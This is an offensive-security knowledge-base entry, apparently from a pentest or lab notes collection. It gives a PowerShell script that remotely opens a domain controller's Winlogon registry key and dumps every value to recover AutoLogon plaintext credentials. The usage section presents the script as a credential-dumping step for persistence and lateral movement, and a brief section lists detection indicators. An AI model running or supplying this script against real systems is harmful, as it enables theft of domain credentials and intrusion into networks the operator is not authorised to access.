---
id: 2c5f6112-a5ed-440a-ac50-c65a8adffde5
name: read-remote-winlogon-registry-script
type: code
language: powershell
verified: true
created_at: '2023-04-06T03:56:06.526067+00:00'
updated_at: '2023-04-10T20:26:17.816023+00:00'
platforms:
  - Windows
tags:
  - registry-access
  - credential-dumping
validated: true
---

# read-remote-winlogon-registry-script

## Code

```powershell
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', 'dc.htb.local',[Microsoft.Win32.RegistryView]::Registry64)
$winlogon = $reg.OpenSubKey('SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon')
$winlogon.GetValueNames() | foreach {"$_ : $(($winlogon).GetValue($_))"}
```

## Description

This PowerShell script connects to a remote Windows registry, opens the Winlogon subkey under HKLM, and enumerates all value names and their data. It targets AutoLogon configurations that may expose plaintext credentials, aiding in persistence or lateral movement.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| 'dc.htb.local' | Target remote hostname | target.domain.local |

## Usage

Run in a PowerShell session with remote registry access (e.g., via SMB/445). Substitute the hostname; requires admin rights on target. Integrate into procedures like [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]] after privilege enablement to dump credentials.

## Detection

- Remote registry access logs (Event ID 4656/4661 on target).
- Network monitoring for RPC/DCOM over port 135 or SMB.
- Anomaly detection in PowerShell scripts querying Winlogon keys.

## Related

- [[procedures/Abusing-Backup-Operators-Group-for-Sensitive-File-Access]]
- [[Mimikatz-Registry-Dumping]]
